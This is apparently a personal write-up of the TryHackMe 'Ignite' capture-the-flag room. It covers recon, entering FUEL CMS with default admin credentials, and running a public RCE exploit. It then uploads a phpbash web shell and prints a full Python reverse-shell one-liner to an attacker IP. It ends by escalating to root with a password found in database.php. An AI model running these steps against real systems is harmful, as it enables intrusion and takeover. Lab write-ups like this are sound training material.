---
title: "Ignite"
categories: ["IT and Cyber Security"]
tags: ['TryHackMe']
date: 2021-01-03
---

## Tools and Commands

- nmap
- searchsploit
- python
- netcat

## Recon

Start with an nmap scan: `$ sudo nmap -A -oA nmap 10.10.194.158`

The only open port is 80, a Apache/2.4.18 web server. View the web page in a browser and we find it's the default page for FUEL CMS 1.4, which also gives us some basic info about the CMS.

A quick Gobuster scan gives us nothing particularly useful: `$ gobuster dir -u http://10.10.194.158 -w /usr/share/wordlists/dirb/common.txt`

While Gobuster was running, read the CMS page. We find many config files are located in "fuel/application/config/" (such as database.php and config.php), and near the bottom it mentions a login page, /fuel, and gives default creds. Check the page and we can log in with them with full admin rights!

Browsing the Dashboard we find a few Upload areas. These could be promising.

## Exploit to Shell

Before going into that, start simply. Checking Searchsploit with `$ searchsploit fuel` gives us "fuelCMS 1.4.1 - Remote Code Execution". Sounds good. Copy it to our working directory with `$ searchsploit -m linux/webapps/47138.py`

Edit the file so the URL in the Python script matches the box script. You'll also need to make sure Burp Suite is open, and turn off Intercept; alternatively, remove the two references to the proxy in the script.

Then run the Python script (using Python 2, as the script is incompatible with Python 3 - `$ python 47138.py`). You'll be presented with a `cmd:` prompt. Try some things, such as `cmd:ls` and `cmd:whoami` to determine you're in - note you'll have to scroll up past the rubbish to get the actual result.

## Upgrade the Shell

This shell is horrible, though, so let's try and upgrade it. There is a browser-based php shell called phpbash, available at [https://github.com/Arrexel/phpbash/blob/master/phpbash.php](https://github.com/Arrexel/phpbash/blob/master/phpbash.php). Download the raw script to your machine with `wget`, set up a local server with `$ python3 -m http.server 4444`, then download the file to the remote machine using `cmd:wget <your-THM-IP>:4444/phpbash.php`. Then, in a browser, visit http://10.10.194.158/phpbash.php and you get a better shell.

We can further improve the shell by making it a Python one, using a script from [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#python](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python). Change the script to include your IP, set up a netcat listener on your machine on port 4242 with `$ nc -lvnp 4242`, and when you run it (in the phpbash shell - it won't work in the `cmd` one) your netcat will give you a shell.

This is the Python reverse shell code: `www-data@ubuntu:/var/www/html#:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.83.23",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`

This shell can be further upgraded, first by running `$ python3 -c 'import pty;pty.spawn("/bin/bash")'`, then `$ export TERM=xterm`, backgrounding this shell with Ctrl-Z, then `$ stty raw -echo; fg`. This gives us a nice, stable, interactive shell :)

## Get the user flag

Now we can get the first flag with `www-data@ubuntu:/var/www/html$ cat /home/www-data/flag.txt`. However, access to root (`$ ls /root`) is unsurprisingly denied.

## PrivEsc

We'll need to privesc. `$ sudo -l` and `$ sudo -i` gives us nothing, and there are no SUIDs found with `$ find / -perm -u=s -type f 2>/dev/null` 

Let's check the config files earlier, especially as one of them mentioned usernames and passwords. Change directory with `$ cd fuel/application/config`, and then search all the files for the phrase "password" using grep: `$ grep -ni password *`.

One result looks interesting, line 80 of "database.php": `database.php:80: 'password' => 'mememe',`.

`$ cat database.php` and have a read about line 80 - it suggests the password is for root!

Try it with `$ su root` and the password, and success! We get a `#` shell, and `# whoami` confirms we're root. 

## Get the root flag

Now simply `# cat /root/root.txt`.